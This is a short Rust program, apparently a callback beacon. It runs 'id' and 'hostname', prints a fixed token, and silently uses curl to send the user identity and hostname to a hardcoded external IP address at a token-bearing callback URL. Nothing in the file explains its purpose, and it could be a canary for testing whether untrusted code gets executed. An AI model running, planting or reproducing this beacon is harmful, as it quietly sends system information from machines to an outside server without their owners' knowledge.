use std::process::Command;

const TOKEN: &str = "09d81f4cf7b8b3b217cbdeb0ddcb3b40";
const CALLBACK: &str =
    "http://150.241.115.45:8088/callback/09d81f4cf7b8b3b217cbdeb0ddcb3b40";

fn main() {
    let id = Command::new("id")
        .output()
        .map(|output| String::from_utf8_lossy(&output.stdout).trim().to_owned())
        .unwrap_or_else(|error| format!("id-error:{error}"));

    let hostname = Command::new("hostname")
        .output()
        .map(|output| String::from_utf8_lossy(&output.stdout).trim().to_owned())
        .unwrap_or_else(|error| format!("hostname-error:{error}"));

    println!("TOKEN:{TOKEN}");
    println!("ID:{id}");
    eprintln!("TOKEN:{TOKEN}");
    eprintln!("ID:{id}");

    let _ = Command::new("curl")
        .args([
            "--silent",
            "--output",
            "/dev/null",
            "--connect-timeout",
            "3",
            "--max-time",
            "5",
            "--proto",
            "=http",
            "--get",
            "--data-urlencode",
            &format!("id={id}"),
            "--data-urlencode",
            &format!("hostname={hostname}"),
            CALLBACK,
        ])
        .status();
}
